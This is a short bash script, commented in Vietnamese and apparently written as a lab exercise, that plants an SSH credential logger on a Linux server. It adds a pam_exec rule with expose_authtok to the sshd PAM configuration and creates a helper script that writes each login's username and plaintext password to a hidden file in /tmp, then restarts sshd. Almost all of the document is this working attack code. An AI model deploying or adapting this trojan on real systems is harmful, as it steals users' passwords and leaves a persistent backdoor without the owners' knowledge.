#!/bin/bash

LOG_FILE="/tmp/.log_sshtrojan1.txt"
SSHD_CONFIG="/etc/ssh/sshd_config"
PAM_SSHD="/etc/pam.d/sshd"



# auth: Điều khiển xác thực trong PAM
# required: yêu cầu xác thực thành công để tiếp tục hoạt động
# pam_exec.so: cho phép thực thi 1 chương trình bên ngoài khi có sự kiện xác thực
# expose_authtok: echo phép truyền mật khẩu
# /tmp/.ssh_pam.log: Chứa log
# /usr/local/bin/log_ssh.sh: đc kích hoạt khi Pam xử lí xác thực 
echo "auth required pam_exec.so expose_authtok log=/tmp/.ssh_pam.log /usr/local/bin/log_ssh.sh" >> "$PAM_SSHD"

# Tạo file log_ssh.sh
cat << 'EOF' > /usr/local/bin/log_ssh.sh
#!/bin/bash
LOG_FILE="/tmp/.log_sshtrojan1.txt"
read password # đọc password mà PAM chuyển vào lm input cho log_ssh.sh
echo "$(date) - SSH Login: $PAM_USER | Password: $password" >> "$LOG_FILE"
EOF

chmod +x /usr/local/bin/log_ssh.sh

# Khởi động lại
systemctl restart sshd
